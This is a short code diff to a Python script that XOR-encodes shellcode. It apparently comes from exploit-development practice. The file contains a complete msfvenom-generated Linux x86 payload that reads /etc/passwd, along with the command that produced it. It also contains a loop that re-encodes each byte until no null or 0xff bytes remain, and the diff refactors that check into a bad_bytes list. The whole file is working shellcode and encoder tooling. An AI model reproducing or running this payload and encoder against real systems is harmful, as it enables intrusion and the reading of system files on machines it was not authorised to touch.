@@ -6,6 +6,8 @@ import binascii
 # msfvenom -p linux/x86/read_file -f c PATH=/etc/passwd  -b '\x00'
 payload = b"\xbe\xd4\xa1\x45\x1e\xda\xc1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x13\x31\x75\x13\x83\xed\xfc\x03\x75\xdb\x43\xb0\xf5\xd5\x3b\x3e\x0a\x19\x3c\x1a\x3b\xd0\xf1\x1c\xb2\x21\xb1\x1e\xc5\xa5\xc2\xa9\x22\x2c\x3b\x13\xac\x3e\xbc\x64\x60\xbe\x35\xa6\xc2\xba\x45\x27\x33\x79\x44\x27\x33\x7d\x8a\xa7\x8b\x7c\x14\xa8\xeb\xc5\x14\xa8\xeb\x39\xd8\x28\x03\xfc\x1d\xd7\x2b\xd1\x84\x5c\xb7\x02\x37\xfc\x44\x2f\xc0\x9a\xaa"
 
+bad_bytes = [ 0xff, 0x00 ]
+
 output = ""
 for b in payload:
     # new random byte to xor with
@@ -16,7 +18,7 @@ for b in payload:
         new_shellcode_byte = b ^ int.from_bytes(rand_byte, 'little')
 
         # check if new shellcode will contatin 0xff or 0x00    
-        if not rand_byte == 0xff and not new_shellcode_byte == 0xff and not rand_byte == 0x00 and not new_shellcode_byte == 0x00:
+        if not rand_byte in bad_bytes and not new_shellcode_byte in bad_bytes:
             break
         print("FOUND 0xFF or 0x00 in rand_byte or new_shellcode_byte, generating new random byte!!")
         
